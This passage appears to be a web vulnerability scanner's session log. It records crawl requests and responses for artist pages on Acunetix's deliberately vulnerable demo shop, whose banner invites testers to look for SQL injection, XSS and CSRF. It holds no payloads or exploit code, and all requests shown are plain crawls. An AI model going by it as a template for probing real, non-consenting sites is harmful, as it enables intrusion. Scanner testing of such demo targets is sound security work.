<title>artists</title>
<!-- InstanceEndEditable -->
<link rel="stylesheet" href="style.css" type="text/css">
<!-- InstanceBeginEditable name="headers_rgn" -->
<!-- here goes headers headers -->
<!-- InstanceEndEditable -->
<script language="JavaScript" type="text/JavaScript">
<!--
function MM_reloadPage(init) {  //reloads the window if Nav4 resized
  if (init==true) with (navigator) {if ((appName=="Netscape")&&(parseInt(appVersion)==4)) {
    document.MM_pgW=innerWidth; document.MM_pgH=innerHeight; onresize=MM_reloadPage; }}
  else if (innerWidth!=document.MM_pgW || innerHeight!=document.MM_pgH) location.reload();
}
MM_reloadPage(true);
//-->
</script>

</head>
<body> 
<div id="mainLayer" style="position:absolute; width:700px; z-index:1">
<div id="masthead"> 
  <h1 id="siteName"><a href="https://www.acunetix.com/"><img src="images/logo.gif" width="306" height="38" border="0" alt="Acunetix website security"></a></h1>   
  <h6 id="siteInfo">TEST and Demonstration site for <a href="https://www.acunetix.com/vulnerability-scanner/">Acunetix Web Vulnerability Scanner</a></h6>
  <div id="globalNav"> 
      	<table border="0" cellpadding="0" cellspacing="0" width="100%"><tr>
	<td align="left">
		<a href="index.php">home</a> | <a href="categories.php">categories</a> | <a href="artists.php">artists
		</a> | <a href="disclaimer.php">disclaimer</a> | <a href="cart.php">your cart</a> | 
		<a href="guestbook.php">guestbook</a> | 
		<a href="AJAX/index.php">AJAX Demo</a>
	</td>
	<td align="right">
		</td>
	</tr></table>
  </div> 
</div> 
<!-- end masthead --> 

<!-- begin content -->
<!-- InstanceBeginEditable name="content_rgn" -->
<div id="content">
	<h2 id='pageName'>artist: r4w8173</h2><div class='story'><p><p>
Lorem ipsum dolor sit amet, consectetuer adipiscing elit. Donec molestie.
    Sed aliquam sem ut arcu. Phasellus sollicitudin. Vestibulum condimentum facilisis
    nulla. In hac habitasse platea dictumst. Nulla nonummy. Cras quis libero.
    Cras venenatis. Aliquam posuere lobortis pede. Nullam fringilla urna id leo.
    Praesent aliquet pretium erat. Praesent non odio. Pellentesque a magna a
    mauris vulputate lacinia. Aenean viverra. Class aptent taciti sociosqu ad
    litora torquent per conubia nostra, per inceptos hymenaeos. Aliquam lacus.
    Mauris magna eros, semper a, tempor et, rutrum et, tortor.
</p>
<p>
Lorem ipsum dolor sit amet, consectetuer adipiscing elit. Donec molestie.
    Sed aliquam sem ut arcu. Phasellus sollicitudin. Vestibulum condimentum facilisis
    nulla. In hac habitasse platea dictumst. Nulla nonummy. Cras quis libero.
    Cras venenatis. Aliquam posuere lobortis pede. Nullam fringilla urna id leo.
    Praesent aliquet pretium erat. Praesent non odio. Pellentesque a magna a
    mauris vulputate lacinia. Aenean viverra. Class aptent taciti sociosqu ad
    litora torquent per conubia nostra, per inceptos hymenaeos. Aliquam lacus.
    Mauris magna eros, semper a, tempor et, rutrum et, tortor.
</p></p><p><a href='listproducts.php?artist=1'>view pictures of the artist</a></p><p><a href='#' onClick="window.open('./comment.php?aid=1','comment','width=500,height=400')">comment on this artist</a></p></div>	
</div>
<!-- InstanceEndEditable -->
<!--end content -->

<div id="navBar"> 
  <div id="search"> 
    <form action="search.php?test=query" method="post"> 
      <label>search art</label> 
      <input name="searchFor" type="text" size="10"> 
      <input name="goButton" type="submit" value="go"> 
    </form> 
  </div> 
  <div id="sectionLinks"> 
    <ul> 
      <li><a href="categories.php">Browse categories</a></li> 
      <li><a href="artists.php">Browse artists</a></li> 
      <li><a href="cart.php">Your cart</a></li> 
      <li><a href="login.php">Signup</a></li>
	  <li><a href="userinfo.php">Your profile</a></li>
	  <li><a href="guestbook.php">Our guestbook</a></li>
		<li><a href="AJAX/index.php">AJAX Demo</a></li>
	  </li> 
    </ul> 
  </div> 
  <div class="relatedLinks"> 
    <h3>Links</h3> 
    <ul> 
      <li><a href="http://www.acunetix.com">Security art</a></li> 
	  <li><a href="https://www.acunetix.com/vulnerability-scanner/php-security-scanner/">PHP scanner</a></li>
	  <li><a href="https://www.acunetix.com/blog/articles/prevent-sql-injection-vulnerabilities-in-php-applications/">PHP vuln help</a></li>
	  <li><a href="http://www.eclectasy.com/Fractal-Explorer/index.html">Fractal Explorer</a></li> 
    </ul> 
  </div> 
  <div id="advert"> 
    <p>
      <object classid="clsid:D27CDB6E-AE6D-11cf-96B8-444553540000" codebase="http://download.macromedia.com/pub/shockwave/cabs/flash/swflash.cab#version=6,0,29,0" width="107" height="66">
        <param name="movie" value="Flash/add.swf">
        <param name=quality value=high>
        <embed src="Flash/add.swf" quality=high pluginspage="http://www.macromedia.com/shockwave/download/index.cgi?P1_Prod_Version=ShockwaveFlash" type="application/x-shockwave-flash" width="107" height="66"></embed>
      </object>
    </p>
  </div> 
</div> 

<!--end navbar --> 
<div id="siteInfo">  <a href="http://www.acunetix.com">About Us</a> | <a href="privacy.php">Privacy Policy</a> | <a href="mailto:wvs@acunetix.com">Contact Us</a> | &copy;2019
  Acunetix Ltd 
</div> 
<br> 
<div style="background-color:lightgray;width:100%;text-align:center;font-size:12px;padding:1px">
<p style="padding-left:5%;padding-right:5%"><b>Warning</b>: This is not a real shop. This is an example PHP application, which is intentionally vulnerable to web attacks. It is intended to help you test Acunetix. It also helps you understand how developer errors and bad configuration may let someone break into your website. You can use it to test other tools and your manual hacking skills as well. Tip: Look for potential SQL Injections, Cross-site Scripting (XSS), and Cross-site Request Forgery (CSRF), and more.</p>
</div>
</div>
</body>
<!-- InstanceEnd --></html>
]]></ResponseBody><Headers><Header><Name>Via</Name><Value>1.1 189.9.60.27 (McAfee Web Gateway 7.8.2.16.0.31231)</Value></Header><Header><Name>Date</Name><Value>Fri, 11 Dec 2020 21:44:41 GMT</Value></Header><Header><Name>Server</Name><Value>nginx/1.19.0</Value></Header><Header><Name>Connection</Name><Value>keep-alive</Value></Header><Header><Name>Content-Type</Name><Value>text/html; charset=UTF-8</Value></Header><Header><Name>X-Powered-By</Name><Value>PHP/5.6.40-38+ubuntu20.04.1+deb.sury.org+1</Value></Header><Header><Name>Content-Length</Name><Value>6251</Value></Header></Headers><SetCookies /><Forms><Form><Action>search.php?test=query</Action><Method>post</Method><Name /><OnSubmit /><InputFields><InputField><Name>searchFor</Name><Value /><Size>10</Size><MaxLength>0</MaxLength><sType>text</sType><Class /></InputField><InputField><Name>goButton</Name><Value>go</Value><Size /><MaxLength>0</MaxLength><sType>submit</sType><Class /></InputField></InputFields><TextAreas /><SelectFields /></Form></Forms></Response></Session><Session requestId="C8A66BC9CE97EE743AAB0212AA76B188"><URL>http://php.vulnweb.com:80/artists.php?artist=2</URL><Scheme>http</Scheme><Host>php.vulnweb.com</Host><Port>80</Port><AttackParamDescriptor /><Issues /><RawRequest id="C8A66BC9CE97EE743AAB0212AA76B188"><![CDATA[GET /artists.php?artist=2 HTTP/1.1
Referer: http://php.vulnweb.com/artists.php
Accept: */*
Pragma: no-cache
Accept-Encoding: gzip, deflate
User-Agent: Mozilla/5.0 (Windows NT 6.2; Win64; x64; rv:58.0) Gecko/20100101 Firefox/58.0
Host: php.vulnweb.com
Connection: Keep-Alive
X-WIPP: AscVersion=20.1.0.199
X-Scan-Memo: Category="Crawl";SID="C8A66BC9CE97EE743AAB0212AA76B188";PSID="1C2302E11CB8EF7DA17F6BF587C55102";SessionType="Crawl";CrawlType="HTML";AttackType="None";OriginatingEngineID="00000000-0000-0000-0000-000000000000";AttributeName="href";Format="NonRooted";LinkKind="HyperLink";Locations="HtmlNode";Source="ScriptExecution";tid="67";tt="31";
X-RequestManager-Memo: sid="25";smi="0";sc="1";ID="66ab7953";
X-Request-Memo: ID="7969f1db";sc="1";tid="37";
Cookie: CustomCookie=WebInspect0

]]></RawRequest><RawResponse><![CDATA[HTTP/1.1 200 OK
Via: 1.1 189.9.60.27 (McAfee Web Gateway 7.8.2.16.0.31231)
Date: Fri, 11 Dec 2020 21:44:42 GMT
Server: nginx/1.19.0
Connection: keep-alive
Content-Type: text/html; charset=UTF-8
X-Powered-By: PHP/5.6.40-38+ubuntu20.04.1+deb.sury.org+1
Content-Length: 6193

<!DOCTYPE HTML PUBLIC "-//W3C//DTD HTML 4.01 Transitional//EN"
"http://www.w3.org/TR/html4/loose.dtd">
<html><!-- InstanceBegin template="/Templates/main_dynamic_template.dwt.php" codeOutsideHTMLIsLocked="false" -->
<head>
<meta http-equiv="Content-Type" content="text/html; charset=iso-8859-2">

<!-- InstanceBeginEditable name="document_title_rgn" -->
<title>artists</title>
<!-- InstanceEndEditable -->
<link rel="stylesheet" href="style.css" type="text/css">
<!-- InstanceBeginEditable name="headers_rgn" -->
<!-- here goes headers headers -->
<!-- InstanceEndEditable -->
<script language="JavaScript" type="text/JavaScript">
<!--
function MM_reloadPage(init) {  //reloads the window if Nav4 resized
  if (init==true) with (navigator) {if ((appName=="Netscape")&&(parseInt(appVersion)==4)) {
    document.MM_pgW=innerWidth; document.MM_pgH=innerHeight; onresize=MM_reloadPage; }}
  else if (innerWidth!=document.MM_pgW || innerHeight!=document.MM_pgH) location.reload();
}
MM_reloadPage(true);
//-->
</script>

</head>
<body> 
<div id="mainLayer" style="position:absolute; width:700px; z-index:1">
<div id="masthead"> 
  <h1 id="siteName"><a href="https://www.acunetix.com/"><img src="images/logo.gif" width="306" height="38" border="0" alt="Acunetix website security"></a></h1>   
  <h6 id="siteInfo">TEST and Demonstration site for <a href="https://www.acunetix.com/vulnerability-scanner/">Acunetix Web Vulnerability Scanner</a></h6>
  <div id="globalNav"> 
      	<table border="0" cellpadding="0" cellspacing="0" width="100%"><tr>
	<td align="left">
		<a href="index.php">home</a> | <a href="categories.php">categories</a> | <a href="artists.php">artists
		</a> | <a href="disclaimer.php">disclaimer</a> | <a href="cart.php">your cart</a> | 
		<a href="guestbook.php">guestbook</a> | 
		<a href="AJAX/index.php">AJAX Demo</a>
	</td>
	<td align="right">
		</td>
	</tr></table>
  </div> 
</div> 
<!-- end masthead --> 

<!-- begin content -->
<!-- InstanceBeginEditable name="content_rgn" -->
<div id="content">
	<h2 id='pageName'>artist: Blad3</h2><div class='story'><p><p>
Lorem ipsum dolor sit amet, consectetuer adipiscing elit. Donec molestie.
Sed aliquam sem ut arcu. Phasellus sollicitudin. Vestibulum condimentum facilisis
nulla. In hac habitasse platea dictumst. Nulla nonummy. Cras quis libero.
Cras venenatis. Aliquam posuere lobortis pede. Nullam fringilla urna id leo.
Praesent aliquet pretium erat. Praesent non odio. Pellentesque a magna a
mauris vulputate lacinia. Aenean viverra. Class aptent taciti sociosqu ad
litora torquent per conubia nostra, per inceptos hymenaeos. Aliquam lacus.
Mauris magna eros, semper a, tempor et, rutrum et, tortor.
</p>
<p>
Lorem ipsum dolor sit amet, consectetuer adipiscing elit. Donec molestie.
Sed aliquam sem ut arcu. Phasellus sollicitudin. Vestibulum condimentum facilisis
nulla. In hac habitasse platea dictumst. Nulla nonummy. Cras quis libero.
Cras venenatis. Aliquam posuere lobortis pede. Nullam fringilla urna id leo.
Praesent aliquet pretium erat. Praesent non odio. Pellentesque a magna a
mauris vulputate lacinia. Aenean viverra. Class aptent taciti sociosqu ad
litora torquent per conubia nostra, per inceptos hymenaeos. Aliquam lacus.
Mauris magna eros, semper a, tempor et, rutrum et, tortor.
</p></p><p><a href='listproducts.php?artist=2'>view pictures of the artist</a></p><p><a href='#' onClick="window.open('./comment.php?aid=2','comment','width=500,height=400')">comment on this artist</a></p></div>	
</div>
<!-- InstanceEndEditable -->
<!--end content -->

<div id="navBar"> 
  <div id="search"> 
    <form action="search.php?test=query" method="post"> 
      <label>search art</label> 
      <input name="searchFor" type="text" size="10"> 
      <input name="goButton" type="submit" value="go"> 
    </form> 
  </div> 
  <div id="sectionLinks"> 
    <ul> 
      <li><a href="categories.php">Browse categories</a></li> 
      <li><a href="artists.php">Browse artists</a></li> 
      <li><a href="cart.php">Your cart</a></li> 
      <li><a href="login.php">Signup</a></li>
	  <li><a href="userinfo.php">Your profile</a></li>
	  <li><a href="guestbook.php">Our guestbook</a></li>
		<li><a href="AJAX/index.php">AJAX Demo</a></li>
	  </li> 
    </ul> 
  </div> 
  <div class="relatedLinks"> 
    <h3>Links</h3> 
    <ul> 
      <li><a href="http://www.acunetix.com">Security art</a></li> 
	  <li><a href="https://www.acunetix.com/vulnerability-scanner/php-security-scanner/">PHP scanner</a></li>
	  <li><a href="https://www.acunetix.com/blog/articles/prevent-sql-injection-vulnerabilities-in-php-applications/">PHP vuln help</a></li>
	  <li><a href="http://www.eclectasy.com/Fractal-Explorer/index.html">Fractal Explorer</a></li> 
    </ul> 
  </div> 
  <div id="advert"> 
    <p>
      <object classid="clsid:D27CDB6E-AE6D-11cf-96B8-444553540000" codebase="http://download.macromedia.com/pub/shockwave/cabs/flash/swflash.cab#version=6,0,29,0" width="107" height="66">
        <param name="movie" value="Flash/add.swf">
        <param name=quality value=high>
        <embed src="Flash/add.swf" quality=high pluginspage="http://www.macromedia.com/shockwave/download/index.cgi?P1_Prod_Version=ShockwaveFlash" type="application/x-shockwave-flash" width="107" height="66"></embed>
      </object>
    </p>
  </div> 
</div> 

<!--end navbar --> 
<div id="siteInfo">  <a href="http://www.acunetix.com">About Us</a> | <a href="privacy.php">Privacy Policy</a> | <a href="mailto:wvs@acunetix.com">Contact Us</a> | &copy;2019
  Acunetix Ltd 
</div> 
<br> 
<div style="background-color:lightgray;width:100%;text-align:center;font-size:12px;padding:1px">
<p style="padding-left:5%;padding-right:5%"><b>Warning</b>: This is not a real shop. This is an example PHP application, which is intentionally vulnerable to web attacks. It is intended to help you test Acunetix. It also helps you understand how developer errors and bad configuration may let someone break into your website. You can use it to test other tools and your manual hacking skills as well. Tip: Look for potential SQL Injections, Cross-site Scripting (XSS), and Cross-site Request Forgery (CSRF), and more.</p>
</div>
</div>
</body>
<!-- InstanceEnd --></html>
]]></RawResponse><Request id="C8A66BC9CE97EE743AAB0212AA76B188"><Method>GET</Method><Path>/</Path><File>artists</File><Ext>php</Ext><PageMark /><HTTPVersion>HTTP/1.1</HTTPVersion><FullQuery>artist=2</FullQuery><FullPostData /><XMLPostData /><MultiPartPostData /><RawASCIIPostData><![CDATA[]]></RawASCIIPostData><Cookie>Cookie: CustomCookie=WebInspect0
</Cookie><Queries><Query><Name>artist</Name><Value>2</Value></Query></Queries><Headers><Header><Name>Referer</Name><Value>http://php.vulnweb.com/artists.php</Value></Header><Header><Name>Accept</Name><Value>*/*</Value></Header><Header><Name>Pragma</Name><Value>no-cache</Value></Header><Header><Name>Accept-Encoding</Name><Value>gzip, deflate</Value></Header><Header><Name>User-Agent</Name><Value>Mozilla/5.0 (Windows NT 6.2; Win64; x64; rv:58.0) Gecko/20100101 Firefox/58.0</Value></Header><Header><Name>Host</Name><Value>php.vulnweb.com</Value></Header><Header><Name>Connection</Name><Value>Keep-Alive</Value></Header><Header><Name>X-WIPP</Name><Value>AscVersion=20.1.0.199</Value></Header><Header><Name>X-Scan-Memo</Name><Value>Category="Crawl";SID="C8A66BC9CE97EE743AAB0212AA76B188";PSID="1C2302E11CB8EF7DA17F6BF587C55102";SessionType="Crawl";CrawlType="HTML";AttackType="None";OriginatingEngineID="00000000-0000-0000-0000-000000000000";AttributeName="href";Format="NonRooted";LinkKind="HyperLink";Locations="HtmlNode";Source="ScriptExecution";tid="67";tt="31";</Value></Header><Header><Name>X-RequestManager-Memo</Name><Value>sid="25";smi="0";sc="1";ID="66ab7953";</Value></Header><Header><Name>X-Request-Memo</Name><Value>ID="7969f1db";sc="1";tid="37";</Value></Header></Headers><Cookies><Cookie><Name>CustomCookie</Name><Value>WebInspect0</Value><Domain /><Path /></Cookie></Cookies></Request><Response><HTTPVersion>HTTP/1.1</HTTPVersion><StatusCode>200</StatusCode><StatusDescription>OK</StatusDescription><SetCookie /><ResponseBody><![CDATA[<!DOCTYPE HTML PUBLIC "-//W3C//DTD HTML 4.01 Transitional//EN"
"http://www.w3.org/TR/html4/loose.dtd">
<html><!-- InstanceBegin template="/Templates/main_dynamic_template.dwt.php" codeOutsideHTMLIsLocked="false" -->
<head>
<meta http-equiv="Content-Type" content="text/html; charset=iso-8859-2">

<!-- InstanceBeginEditable name="document_title_rgn" -->
<title>artists</title>
<!-- InstanceEndEditable -->
<link rel="stylesheet" href="style.css" type="text/css">
<!-- InstanceBeginEditable name="headers_rgn" -->
<!-- here goes headers headers -->
<!-- InstanceEndEditable -->
<script language="JavaScript" type="text/JavaScript">
<!--
function MM_reloadPage(init) {  //reloads the window if Nav4 resized
  if (init==true) with (navigator) {if ((appName=="Netscape")&&(parseInt(appVersion)==4)) {
    document.MM_pgW=innerWidth; document.MM_pgH=innerHeight; onresize=MM_reloadPage; }}
  else if (innerWidth!=document.MM_pgW || innerHeight!=document.MM_pgH) location.reload();
}
MM_reloadPage(true);
//-->
</script>

</head>
<body> 
<div id="mainLayer" style="position:absolute; width:700px; z-index:1">
<div id="masthead"> 
  <h1 id="siteName"><a href="https://www.acunetix.com/"><img src="images/logo.gif" width="306" height="38" border="0" alt="Acunetix website security"></a></h1>   
  <h6 id="siteInfo">TEST and Demonstration site for <a href="https://www.acunetix.com/vulnerability-scanner/">Acunetix Web Vulnerability Scanner</a></h6>
  <div id="globalNav"> 
      	<table border="0" cellpadding="0" cellspacing="0" width="100%"><tr>
	<td align="left">
		<a href="index.php">home</a> | <a href="categories.php">categories</a> | <a href="artists.php">artists
		</a> | <a href="disclaimer.php">disclaimer</a> | <a href="cart.php">your cart</a> | 
		<a href="guestbook.php">guestbook</a> | 
		<a href="AJAX/index.php">AJAX Demo</a>
	</td>
	<td align="right">
		</td>
	</tr></table>
  </div> 
</div> 
<!-- end masthead --> 

<!-- begin content -->
<!-- InstanceBeginEditable name="content_rgn" -->
<div id="content">
	<h2 id='pageName'>artist: Blad3</h2><div class='story'><p><p>
Lorem ipsum dolor sit amet, consectetuer adipiscing elit. Donec molestie.
Sed aliquam sem ut arcu. Phasellus sollicitudin. Vestibulum condimentum facilisis
nulla. In hac habitasse platea dictumst. Nulla nonummy. Cras quis libero.
Cras venenatis. Aliquam posuere lobortis pede. Nullam fringilla urna id leo.
Praesent aliquet pretium erat. Praesent non odio. Pellentesque a magna a
mauris vulputate lacinia. Aenean viverra. Class aptent taciti sociosqu ad
litora torquent per conubia nostra, per inceptos hymenaeos. Aliquam lacus.
Mauris magna eros, semper a, tempor et, rutrum et, tortor.
</p>
<p>
Lorem ipsum dolor sit amet, consectetuer adipiscing elit. Donec molestie.
Sed aliquam sem ut arcu. Phasellus sollicitudin. Vestibulum condimentum facilisis
nulla. In hac habitasse platea dictumst. Nulla nonummy. Cras quis libero.
Cras venenatis. Aliquam posuere lobortis pede. Nullam fringilla urna id leo.
Praesent aliquet pretium erat. Praesent non odio. Pellentesque a magna a
mauris vulputate lacinia. Aenean viverra. Class aptent taciti sociosqu ad
litora torquent per conubia nostra, per inceptos hymenaeos. Aliquam lacus.
Mauris magna eros, semper a, tempor et, rutrum et, tortor.
</p></p><p><a href='listproducts.php?artist=2'>view pictures of the artist</a></p><p><a href='#' onClick="window.open('./comment.php?aid=2','comment','width=500,height=400')">comment on this artist</a></p></div>	
</div>
<!-- InstanceEndEditable -->
<!--end content -->

<div id="navBar"> 
  <div id="search"> 
    <form action="search.php?test=query" method="post"> 
      <label>search art</label> 
      <input name="searchFor" type="text" size="10"> 
      <input name="goButton" type="submit" value="go"> 
    </form> 
  </div> 
  <div id="sectionLinks"> 
    <ul> 
      <li><a href="categories.php">Browse categories</a></li> 
      <li><a href="artists.php">Browse artists</a></li> 
      <li><a href="cart.php">Your cart</a></li> 
      <li><a href="login.php">Signup</a></li>
	  <li><a href="userinfo.php">Your profile</a></li>
	  <li><a href="guestbook.php">Our guestbook</a></li>
		<li><a href="AJAX/index.php">AJAX Demo</a></li>
	  </li> 
    </ul> 
  </div> 
  <div class="relatedLinks"> 
    <h3>Links</h3> 
    <ul> 
      <li><a href="http://www.acunetix.com">Security art</a></li> 
	  <li><a href="https://www.acunetix.com/vulnerability-scanner/php-security-scanner/">PHP scanner</a></li>
	  <li><a href="https://www.acunetix.com/blog/articles/prevent-sql-injection-vulnerabilities-in-php-applications/">PHP vuln help</a></li>
	  <li><a href="http://www.eclectasy.com/Fractal-Explorer/index.html">Fractal Explorer</a></li> 
    </ul> 
  </div> 
  <div id="advert"> 
    <p>
      <object classid="clsid:D27CDB6E-AE6D-11cf-96B8-444553540000" codebase="http://download.macromedia.com/pub/shockwave/cabs/flash/swflash.cab#version=6,0,29,0" width="107" height="66">
        <param name="movie" value="Flash/add.swf">
        <param name=quality value=high>
        <embed src="Flash/add.swf" quality=high pluginspage="http://www.macromedia.com/shockwave/download/index.cgi?P1_Prod_Version=ShockwaveFlash" type="application/x-shockwave-flash" width="107" height="66"></embed>
      </object>
    </p>
  </div> 
</div> 

<!--end navbar --> 
<div id="siteInfo">  <a href="http://www.acunetix.com">About Us</a> | <a href="privacy.php">Privacy Policy</a> | <a href="mailto:wvs@acunetix.com">Contact Us</a> | &copy;2019
  Acunetix Ltd 
</div> 
<br> 
<div style="background-color:lightgray;width:100%;text-align:center;font-size:12px;padding:1px">
<p style="padding-left:5%;padding-right:5%"><b>Warning</b>: This is not a real shop. This is an example PHP application, which is intentionally vulnerable to web attacks. It is intended to help you test Acunetix. It also helps you understand how developer errors and bad configuration may let someone break into your website. You can use it to test other tools and your manual hacking skills as well. Tip: Look for potential SQL Injections, Cross-site Scripting (XSS), and Cross-site Request Forgery (CSRF), and more.</p>
</div>
</div>
</body>
<!-- InstanceEnd --></html>
]]></ResponseBody><Headers><Header><Name>Via</Name><Value>1.1 189.9.60.27 (McAfee Web Gateway 7.8.2.16.0.31231)</Value></Header><Header><Name>Date</Name><Value>Fri, 11 Dec 2020 21:44:42 GMT</Value></Header><Header><Name>Server</Name><Value>nginx/1.19.0</Value></Header><Header><Name>Connection</Name><Value>keep-alive</Value></Header><Header><Name>Content-Type</Name><Value>text/html; charset=UTF-8</Value></Header><Header><Name>X-Powered-By</Name><Value>PHP/5.6.40-38+ubuntu20.04.1+deb.sury.org+1</Value></Header><Header><Name>Content-Length</Name><Value>6193</Value></Header></Headers><SetCookies /><Forms><Form><Action>search.php?test=query</Action><Method>post</Method><Name /><OnSubmit /><InputFields><InputField><Name>searchFor</Name><Value /><Size>10</Size><MaxLength>0</MaxLength><sType>text</sType><Class /></InputField><InputField><Name>goButton</Name><Value>go</Value><Size /><MaxLength>0</MaxLength><sType>submit</sType><Class /></InputField></InputFields><TextAreas /><SelectFields /></Form></Forms></Response></Session><Session requestId="3607E7419B6AF8069179E2E6CB83DB8B"><URL>http://php.vulnweb.com:80/artists.php?artist=3</URL><Scheme>http</Scheme><Host>php.vulnweb.com</Host><Port>80</Port><AttackParamDescriptor /><Issues /><RawRequest id="3607E7419B6AF8069179E2E6CB83DB8B"><![CDATA[GET /artists.php?artist=3 HTTP/1.1
Referer: http://php.vulnweb.com/artists.php
Accept: */*
Pragma: no-cache
Accept-Encoding: gzip, deflate
User-Agent: Mozilla/5.0 (Windows NT 6.2; Win64; x64; rv:58.0) Gecko/20100101 Firefox/58.0
Host: php.vulnweb.com
Connection: Keep-Alive
X-WIPP: AscVersion=20.1.0.199
X-Scan-Memo: Category="Crawl";SID="3607E7419B6AF8069179E2E6CB83DB8B";PSID="1C2302E11CB8EF7DA17F6BF587C55102";SessionType="Crawl";CrawlType="HTML";AttackType="None";OriginatingEngineID="00000000-0000-0000-0000-000000000000";AttributeName="href";Format="NonRooted";LinkKind="HyperLink";Locations="HtmlNode";Source="ScriptExecution";tid="67";tt="31";
X-RequestManager-Memo: sid="25";smi="0";sc="1";ID="c957f4ba";
X-Request-Memo: ID="1b188a39";sc="1";tid="36";
Cookie: CustomCookie=WebInspect0

]]></RawRequest><RawResponse><![CDATA[HTTP/1.1 200 OK
Via: 1.1 189.9.60.27 (McAfee Web Gateway 7.8.2.16.0.31231)
Date: Fri, 11 Dec 2020 21:44:43 GMT
Server: nginx/1.19.0
Connection: keep-alive
Content-Type: text/html; charset=UTF-8
X-Powered-By: PHP/5.6.40-38+ubuntu20.04.1+deb.sury.org+1
Content-Length: 6193

<!DOCTYPE HTML PUBLIC "-//W3C//DTD HTML 4.01 Transitional//EN"
"http://www.w3.org/TR/html4/loose.dtd">
<html><!-- InstanceBegin template="/Templates/main_dynamic_template.dwt.php" codeOutsideHTMLIsLocked="false" -->
<head>
<meta http-equiv="Content-Type" content="text/html; charset=iso-8859-2">

<!-- InstanceBeginEditable name="document_title_rgn" -->
<title>artists</title>
<!-- InstanceEndEditable -->
<link rel="stylesheet" href="style.css" type="text/css">
<!-- InstanceBeginEditable name="headers_rgn" -->
<!-- here goes headers headers -->
<!-- InstanceEndEditable -->
<script language="JavaScript" type="text/JavaScript">
<!--
function MM_reloadPage(init) {  //reloads the window if Nav4 resized
  if (init==true) with (navigator) {if ((appName=="Netscape")&&(parseInt(appVersion)==4)) {
    document.MM_pgW=innerWidth; document.MM_pgH=innerHeight; onresize=MM_reloadPage; }}
  else if (innerWidth!=document.MM_pgW || innerHeight!=document.MM_pgH) location.reload();
}
MM_reloadPage(true);
//-->
</script>

</head>
<body> 
<div id="mainLayer" style="position:absolute; width:700px; z-index:1">
<div id="masthead"> 
  <h1 id="siteName"><a href="https://www.acunetix.com/"><img src="images/logo.gif" width="306" height="38" border="0" alt="Acunetix website security"></a></h1>   
  <h6 id="siteInfo">TEST and Demonstration site for <a href="https://www.acunetix.com/vulnerability-scanner/">Acunetix Web Vulnerability Scanner</a></h6>
  <div id="globalNav"> 
      	<table border="0" cellpadding="0" cellspacing="0" width="100%"><tr>
	<td align="left">
		<a href="index.php">home</a> | <a href="categories.php">categories</a> | <a href="artists.php">artists
		</a> | <a href="disclaimer.php">disclaimer</a> | <a href="cart.php">your cart</a> | 
		<a href="guestbook.php">guestbook</a> | 
		<a href="AJAX/index.php">AJAX Demo</a>
	</td>
	<td align="right">
		</td>
	</tr></table>
  </div> 
</div> 
<!-- end masthead --> 

<!-- begin content -->
<!-- InstanceBeginEditable name="content_rgn" -->
<div id="content">
	<h2 id='pageName'>artist: lyzae</h2><div class='story'><p><p>
Lorem ipsum dolor sit amet, consectetuer adipiscing elit. Donec molestie.
Sed aliquam sem ut arcu. Phasellus sollicitudin. Vestibulum condimentum facilisis
nulla. In hac habitasse platea dictumst. Nulla nonummy. Cras quis libero.
Cras venenatis. Aliquam posuere lobortis pede. Nullam fringilla urna id leo.
Praesent aliquet pretium erat. Praesent non odio. Pellentesque a magna a
mauris vulputate lacinia. Aenean viverra. Class aptent taciti sociosqu ad
litora torquent per conubia nostra, per inceptos hymenaeos. Aliquam lacus.
Mauris magna eros, semper a, tempor et, rutrum et, tortor.
</p>
<p>
Lorem ipsum dolor sit amet, consectetuer adipiscing elit. Donec molestie.
Sed aliquam sem ut arcu. Phasellus sollicitudin. Vestibulum condimentum facilisis
nulla. In hac habitasse platea dictumst. Nulla nonummy. Cras quis libero.
Cras venenatis. Aliquam posuere lobortis pede. Nullam fringilla urna id leo.
Praesent aliquet pretium erat. Praesent non odio. Pellentesque a magna a
mauris vulputate lacinia. Aenean viverra. Class aptent taciti sociosqu ad
litora torquent per conubia nostra, per inceptos hymenaeos. Aliquam lacus.
Mauris magna eros, semper a, tempor et, rutrum et, tortor.
</p></p><p><a href='listproducts.php?artist=3'>view pictures of the artist</a></p><p><a href='#' onClick="window.open('./comment.php?aid=3','comment','width=500,height=400')">comment on this artist</a></p></div>	
</div>
<!-- InstanceEndEditable -->
<!--end content -->

<div id="navBar"> 
  <div id="search"> 
    <form action="search.php?test=query" method="post"> 
      <label>search art</label> 
      <input name="searchFor" type="text" size="10"> 
      <input name="goButton" type="submit" value="go"> 
    </form> 
  </div> 
  <div id="sectionLinks"> 
    <ul> 
      <li><a href="categories.php">Browse categories</a></li> 
      <li><a href="artists.php">Browse artists</a></li> 
      <li><a href="cart.php">Your cart</a></li> 
      <li><a href="login.php">Signup</a></li>
	  <li><a href="userinfo.php">Your profile</a></li>
	  <li><a href="guestbook.php">Our guestbook</a></li>
		<li><a href="AJAX/index.php">AJAX Demo</a></li>
	  </li> 
    </ul> 
  </div> 
  <div class="relatedLinks"> 
    <h3>Links</h3> 
    <ul> 
      <li><a href="http://www.acunetix.com">Security art</a></li> 
	  <li><a href="https://www.acunetix.com/vulnerability-scanner/php-security-scanner/">PHP scanner</a></li>
	  <li><a href="https://www.acunetix.com/blog/articles/prevent-sql-injection-vulnerabilities-in-php-applications/">PHP vuln help</a></li>
	  <li><a href="http://www.eclectasy.com/Fractal-Explorer/index.html">Fractal Explorer</a></li> 
    </ul> 
  </div> 
  <div id="advert"> 
    <p>
      <object classid="clsid:D27CDB6E-AE6D-11cf-96B8-444553540000" codebase="http://download.macromedia.com/pub/shockwave/cabs/flash/swflash.cab#version=6,0,29,0" width="107" height="66">
        <param name="movie" value="Flash/add.swf">
        <param name=quality value=high>
        <embed src="Flash/add.swf" quality=high pluginspage="http://www.macromedia.com/shockwave/download/index.cgi?P1_Prod_Version=ShockwaveFlash" type="application/x-shockwave-flash" width="107" height="66"></embed>
      </object>
    </p>
  </div> 
</div> 

<!--end navbar --> 
<div id="siteInfo">  <a href="http://www.acunetix.com">About Us</a> | <a href="privacy.php">Privacy Policy</a> | <a href="mailto:wvs@acunetix.com">Contact Us</a> | &copy;2019
  Acunetix Ltd 
</div> 
<br> 
<div style="background-color:lightgray;width:100%;text-align:center;font-size:12px;padding:1px">
<p style="padding-left:5%;padding-right:5%"><b>Warning</b>: This is not a real shop. This is an example PHP application, which is intentionally vulnerable to web attacks. It is intended to help you test Acunetix. It also helps you understand how developer errors and bad configuration may let someone break into your website. You can use it to test other tools and your manual hacking skills as well. Tip: Look for potential SQL Injections, Cross-site Scripting (XSS), and Cross-site Request Forgery (CSRF), and more.</p>
</div>
</div>
</body>
